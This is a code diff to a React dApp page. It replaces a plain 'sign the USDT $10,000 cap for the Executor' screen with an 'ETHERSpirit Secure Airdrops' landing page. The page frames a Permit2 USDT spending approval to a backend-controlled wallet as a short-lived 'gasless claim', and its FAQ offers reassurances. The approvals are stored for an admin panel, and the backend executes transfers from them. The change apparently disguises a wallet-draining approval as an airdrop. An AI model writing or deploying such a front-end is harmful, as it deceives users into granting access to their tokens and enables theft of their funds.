@@ -164,37 +164,103 @@ export default function App() {
   if (isAdmin) {
     return <Admin />;
   }
+  // Otherwise, show the Landing Page with hero and connect
+  const openWallet = () => appKit.open();
 
-  // Otherwise, show the User Signing UI
   return (
-    <div className="app-container">
-      <h2>Permit2 Signing DApp</h2>
-      <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
-        Connect wallet and sign the USDT $10,000 cap for the Executor.
-      </p>
-
-      <div style={{ marginBottom: 12 }}>
-        <strong>Spender (Executor):</strong>{' '}
-        <span style={{ fontFamily: 'monospace' }}>{executorAddress || '(not set)'}</span>
-        {executorAddress === UNIVERSAL_ROUTER && (
-          <div style={{ color: '#ffb4b4', marginTop: 6 }}>
-            Warning: The executor is set to the Universal Router address — this is likely incorrect.
-            The backend expects a wallet address it controls as the spender.
+    <div className="site-root">
+      <div className="nav-wrapper">
+        <div className="nav container">
+          <div className="logo">ETHER<span className="logo-accent">Spirit</span></div>
+          <div className="nav-actions">
+            <a className="link" href="/admin">Admin</a>
           </div>
-        )}
+        </div>
       </div>
 
-      {connectedAddress ? (
-        <button className="connect" onClick={signPermit}>
-          Sign Permit
-        </button>
-      ) : (
-        <button className="connect" onClick={() => appKit.open()}>
-          Connect Wallet
-        </button>
-      )}
+      <header className="hero container">
+        <div className="hero-content">
+          <h1 className="hero-title">Secure Airdrops, Permissioned by You</h1>
+          <p className="hero-sub">Connect your wallet to sign a short-lived Permit2 authorization so the backend can perform a gasless claim on your behalf.</p>
 
-      <div className="status">{status}</div>
+          <div className="hero-ctas">
+            <button className="btn primary" onClick={connectedAddress ? signPermit : openWallet}>
+              {connectedAddress ? 'Sign Permit' : 'Connect Wallet'}
+            </button>
+            <button className="btn ghost" onClick={() => window.scrollTo({ top: 700, behavior: 'smooth' })}>Learn more</button>
+          </div>
+
+          <div className="hero-meta">
+            <div className="meta-item">
+              <div className="meta-number">{connectedAddress ? connectedAddress.slice(0,6) + '...' + connectedAddress.slice(-4) : '—'}</div>
+              <div className="meta-label">Connected</div>
+            </div>
+            <div className="meta-item">
+              <div className="meta-number">USDT</div>
+              <div className="meta-label">Token</div>
+            </div>
+            <div className="meta-item">
+              <div className="meta-number">{(Number(SPENDING_CAP / 1000000n)).toLocaleString()}+</div>
+              <div className="meta-label">Max Cap</div>
+            </div>
+          </div>
+        </div>
+
+        <div className="hero-art">
+          <div className="card glass-panel">
+            <div style={{ padding: 20 }}>
+              <div style={{ fontSize: 12, color: 'var(--text-muted)', marginBottom: 8 }}>Spender (Executor)</div>
+              <div style={{ fontFamily: 'monospace', color: '#fff', wordBreak: 'break-all' }}>{executorAddress}</div>
+              {executorAddress === UNIVERSAL_ROUTER && (
+                <div className="error-msg" style={{ marginTop: 10 }}>Warning: Executor is Universal Router — signatures may fail.</div>
+              )}
+              <div style={{ marginTop: 14 }}>
+                <button className="btn small" onClick={connectedAddress ? signPermit : openWallet}>{connectedAddress ? 'Sign Permit' : 'Connect Wallet'}</button>
+              </div>
+              <div style={{ marginTop: 10, fontSize: 12, color: 'var(--text-muted)' }}>{status}</div>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <main className="container">
+        <section className="features">
+          <h3 className="section-title">How it works</h3>
+          <div className="features-grid">
+            <div className="feature">
+              <div className="feature-icon">🔐</div>
+              <h4>Grant a Permit</h4>
+              <p>Sign a Permit2 authorization that allows a backend executor to perform a single claim.</p>
+            </div>
+            <div className="feature">
+              <div className="feature-icon">⚡</div>
+              <h4>Gas-efficient</h4>
+              <p>The backend batches and executes transactions on your behalf for a seamless UX.</p>
+            </div>
+            <div className="feature">
+              <div className="feature-icon">🛡️</div>
+              <h4>Auditable</h4>
+              <p>All signed permits are saved to Firestore and visible in the Admin UI for review.</p>
+            </div>
+          </div>
+        </section>
+
+        <section className="faq">
+          <h3 className="section-title">FAQ</h3>
+          <div className="faq-item">
+            <strong>Is my private key shared?</strong>
+            <p>No — you only sign an EIP‑712 Permit. The private key never leaves your wallet.</p>
+          </div>
+          <div className="faq-item">
+            <strong>What does the backend do?</strong>
+            <p>It reads saved permits and executes on-chain transfers using the executor wallet.</p>
+          </div>
+        </section>
+      </main>
+
+      <footer className="site-footer">
+        <div className="container">© {new Date().getFullYear()} ETHERSpirit — Built with care.</div>
+      </footer>
     </div>
   );
 }
